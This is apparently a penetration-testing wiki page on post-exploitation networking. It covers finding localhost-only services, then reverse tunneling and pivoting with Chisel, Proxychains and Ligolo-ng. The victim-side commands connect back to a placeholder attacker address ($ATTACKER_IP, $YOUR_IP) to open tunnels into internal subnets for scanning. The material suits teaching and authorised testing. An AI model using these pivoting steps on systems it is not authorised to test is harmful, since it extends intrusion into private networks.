---
description: How to best communicate between you and everything on your target
---

# Networking

## Enumerating Network Services

Developers often only expose ports to the public when they need to, so unnecessary ports like MySQL are often only reachable from the inside. While for an attacker, that is a gold mine. So when you get a shell on a machine as a low-privileged user, you might want to try and access these internal services.&#x20;

First off, you can **view all the listening ports** with the following command:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netstat -punta | grep LISTEN
</strong>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
<strong>$ ss -nltpu | grep LISTEN  # Alternative
</strong></code></pre>

In the above example, there are two ports that listen on `0.0.0.0`, meaning they allow connections from anywhere. But more interesting, there are two other ports that listen on `127.0.0.1`. This means they are only accessible from localhost, or the machine itself. It does not allow connections from the outside.&#x20;

So when you are on a machine with any ports open on the `127.0.0.1` address, you can now access them from the inside. We can run commands like `curl`, or `mysql` on the machine itself, but we would have to be lucky that those programs are installed, or that they can be downloaded. We also then work completely on the command line, and a graphical application like a browser would not work.&#x20;

## Tunneling

This is where tunneling comes in. It allows you to create a path for the traffic where it is initially sent to your attacking machine and then forwarded to the actual target. This allows you to use all of your own installed tools on that localhost port, in order to attack the target machine.&#x20;

### Chisel

{% embed url="https://github.com/jpillora/chisel" %}
A tool with a client and server to tunnel traffic to a target's localhost
{% endembed %}

Chisel is an HTTP tunneling tool that is very easy to set up. You simply need a **server** on your own machine, and a **client** on the target machine that connects to your server. Simply **copy** **a binary** from the [releases](https://github.com/jpillora/chisel/releases) (Linux or Windows) to you and your target, and then the basic commands are as follows:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ chisel server -p 8080 --reverse  # Attacker: server
</strong>2023/01/01 00:00:00 server: Reverse tunneling enabled
2023/01/01 00:00:00 server: Fingerprint raoElJaMVZlkiW9tCVXfLxR8IpBoQayS7wqa2ntl8sk=
2023/01/01 00:00:00 server: Listening on http://0.0.0.0:8080

<strong>$ ./chisel client $YOUR_IP:8080 R:socks  # Target: client
</strong>2023/01/01 00:00:00 client: Connecting to ws://10.10.10.10:8080
2023/01/01 00:00:00 client: Connected
</code></pre>

{% hint style="info" %}
**Note**: This requires two extra terminal screens to run these two commands, which both need to keep running to keep your connection alive
{% endhint %}

After the client connects, you should see a message like the following:

```
2023/01/01 00:00:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

This means the client successfully connected, and a tunnel was made. It tells you now that on your own `127.0.0.1:1080`, there now exists a socks proxy that you can use with all your tools.&#x20;

### Proxychains

{% embed url="https://github.com/haad/proxychains" %}
A tool that forces any TCP connection made by any given application to follow through a proxy
{% endembed %}

Proxychains is a tool that allows you to proxy existing tools to your new socks proxy from above. It just requires a tiny bit of configuration to make sure it knows to use the socks proxy we created on port `1080`. This is done using the `/etc/proxychains.conf` file. It might already contain some settings, but just change the `[ProxyList]` at the end to add your socks5 proxy:

<pre class="language-toml"><code class="lang-toml">[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
<strong>socks5 127.0.0.1 1080
</strong></code></pre>

With this set, you can now simply **prepend** `proxychains` to the command, and your localhost becomes the target localhost!

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ proxychains curl localhost:3000
</strong>[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:3000  ...  OK
&#x3C;!DOCTYPE html>
...

<strong>$ proxychains firefox --offline
</strong></code></pre>

### Ligolo-ng

{% embed url="https://github.com/nicocha30/ligolo-ng" %}

While [#chisel](networking.md#chisel "mention") makes it easy to tunnel through one host, it gets difficult when deeper tunnels are involved and prepending `proxychains` before every command is slow. Luckily, `ligolo-ng` comes to the rescue with a VPN approach that allows you to manage connections from a central server ("proxy"). Any client ("agent") can connect with this server, either directly or through an existing client to join the network.&#x20;

By creating TUN interfaces on your local machine with routes to the remote networks, you can use tools like normal as if you are directly connecting to the IP address, and the VPN will make sure it gets routed over the tunnels.&#x20;

To get started, the [README.md](https://github.com/nicocha30/ligolo-ng/blob/master/README.md#building--usage) explains most practical scenarios. Agents can either be on Linux (ELF) or Windows (EXE), which can be found precompiled in the [releases](https://github.com/nicocha30/ligolo-ng/releases). \
You start by setting up a server, which can use a _self-signed_ certificate (`-selfcert`) in a **testing/lab** environment, but should ideally be a _Let's Encrypt_ certificate for a **real engagement** (`-autocert`).&#x20;

{% code title="Attacker Server" %}
```bash
ligolo-proxy -selfcert
```
{% endcode %}

Afterward, the `:11601` port opens up for agents to connect to. They need to have downloaded a compatible "agent" binary and run it with the address to your server, making sure it is accessible:

{% code title="Victim Client" %}
```bash
./agent -connect $ATTACKER_IP:11601 -ignore-cert
```
{% endcode %}

You should instantly receive a "Agent joined" message in your server, choose it using `session`:

<pre class="language-clike"><code class="lang-clike"><strong>ligolo-ng » session
</strong>? Specify a session :  [Use arrows to move, type to filter]
<strong>> 1 - #1 - user@TARGET - 10.10.10.10:52286
</strong></code></pre>

After pressing **Enter**, the `ifconfig` command shows you what network interfaces are available. If you find any networks here you didn't have access to before, you should _add its route_ locally.\
Starting a session requires a tunnel interface to bind the route to. On Linux, these need to be manually created with a name, like `ligolo` (Windows will do this automatically):

{% code title="Linux setup" %}
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```
{% endcode %}

After this is done, you can use `start` in the session to connect the tunnel. By default, it uses the `ligolo` interface, but using `--tun` you can specify any other name.&#x20;

```bash
[Agent : user@TARGET] » start
[Agent : user@TARGET] » start --tun ligolo2
```

Now that it is connected, the last step is adding the route locally so your machine knows it can reach it. If you want to get access to the `192.168.0.0/24` subnet, for example, add its route to the interface you just started:

{% code title="Linux" %}
```bash
sudo ip route add 192.168.0.0/24 dev ligolo
```
{% endcode %}

{% code title="Windows (admin)" %}
```powershell
PS C:\> netsh int ipv4 show interfaces
Idx     Met         MTU          State                Name
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
...
PS C:\> route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if $INTERFACE_IDX
```
{% endcode %}

Now, you should be able to reach into this internal network through the tunnel using tools like `nmap`:

```bash
nmap 192.168.0.0/24 -v -sV -n
```

#### Tunneling deeper networks

If you find any more vulnerabilities in the new network, you might find even deeper subnets that even the initial machine couldn't access. This second compromised client can also connect to the proxy, but may not be able to reach our attacker server. Therefore we can use one of ligolo-ng's features to open up a port on the first client, so that the second client can access it, creating a chain of sorts.&#x20;

When connected to a `session`, the `listener_add` command allows you to forward local ports to an agent ([docs](https://github.com/nicocha30/ligolo-ng/blob/master/README.md#agent-bindinglistening)). This can be used to extend our `:11601` port onto different agents so that any new clients can connect to any connected agent.&#x20;

To do this, start a listener on the agent that forwards the port to our local proxy listener:

```bash
[Agent : user@TARGET] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Now a deeper client can connect to the compromised agent, as it should be reachable:

```
./agent -connect $CLIENT_IP:11601 -ignore-cert
```

After another session is created, you can once again configure it by selecting it in `session`. Then to get _its_ internal networks you can do the same as before: create an interface, start the tunnel, and add a route. Note that the name of this interface on Linux needs to be unique:

{% code title="Linux" %}
```bash
sudo ip route add 192.168.0.0/24 dev ligolo2
```
{% endcode %}

```
[Agent : user@TARGET2] » start --tun ligolo2
```

Finally, you can add the routes of this new client to your interface:

```bash
sudo ip route add 172.16.0.0/24 dev ligolo2
```

Now this doubly-tunneled route should be seamlessly accessible using `nmap` and such again.&#x20;

{% hint style="info" %}
**Tip**: A special hardcoded IP address in ligolo-ng is _240.0.0.1_, which redirects to 127.0.0.1 (localhost) of the agent that the interface belongs to. This can be used to access internally-listening services as well. You only need to add this route to the agent's tun interface:

<pre class="language-bash"><code class="lang-bash"><strong>sudo ip route add 240.0.0.1/32 dev ligolo
</strong></code></pre>
{% endhint %}
